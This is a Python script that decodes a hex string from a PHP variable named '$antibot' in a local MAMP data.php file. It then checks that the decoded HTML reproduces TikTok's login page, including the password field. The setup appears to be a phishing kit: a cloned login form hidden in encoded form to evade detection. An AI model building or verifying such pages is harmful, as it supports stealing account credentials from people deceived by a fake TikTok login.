#!/usr/bin/env python3

import binascii
import re

def verify_tiktok_content():
    try:
        # Find and extract the hex string from data.php
        with open('/Applications/MAMP/htdocs/data.php', 'r') as f:
            content = f.read()

        # Extract hex between " and ";
        start = content.find('$antibot = "') + len('$antibot = "')
        end = content.find('";', start)
        hex_str = content[start:end]

        # Decode
        html = binascii.unhexlify(hex_str).decode('utf-8')

        # Check for key features
        checks = [
            ('TikTok Logo', '<div class="tiktok-logo">' in html),
            ('Log in Title', 'Log in' in html),
            ('Phone Tab', 'Phone</button>' in html),
            ('Email Tab', 'Email or username</button>' in html),
            ('Password Field', '<input type="password"' in html),
            ('Continue Button', 'Continue</button>' in html)
        ]

        print("Verifying TikTok login page content in htdocs/data.php:")
        all_passed = True
        for name, passed in checks:
            status = "✅" if passed else "❌"
            print(f"{status} {name}: {'Found' if passed else 'Not found'}")
            if not passed:
                all_passed = False

        print(f"\n{'✅ SUCCESS: ' if all_passed else '❌ ISSUES:'} All TikTok features {'present' if all_passed else 'NOT present'}!")

        return all_passed

    except Exception as e:
        print(f"❌ Error verifying: {e}")
        return False

if __name__ == "__main__":
    verify_tiktok_content()
